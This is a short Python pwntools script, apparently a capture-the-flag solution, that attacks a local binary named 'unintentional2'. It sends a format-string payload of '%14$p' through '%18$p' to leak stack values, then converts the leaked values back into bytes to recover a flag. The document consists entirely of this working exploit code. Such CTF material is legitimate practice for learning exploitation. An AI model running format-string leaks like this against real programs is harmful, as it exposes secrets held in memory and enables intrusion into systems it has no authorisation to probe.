#!/usr/bin/env python3

from pwn import *

p = process('./unintentional2')

payload = b'%14$p,%15$p,%16$p,%17$p,%18$p'
p.sendlineafter(b'what: ', payload)

leaks = p.recvline()[:-1].split(b',')
print(f"leaks: {leaks}")

part1 = p64(int(leaks[0], 16))
part2 = p64(int(leaks[1], 16))
part3 = p64(int(leaks[2], 16))
part4 = p64(int(leaks[3], 16))
part5 = p64(int(leaks[4], 16))

flag = part1 + part2 + part3 + part4 + part5

print("Flag:", flag.decode(errors='ignore'))
p.interactive()
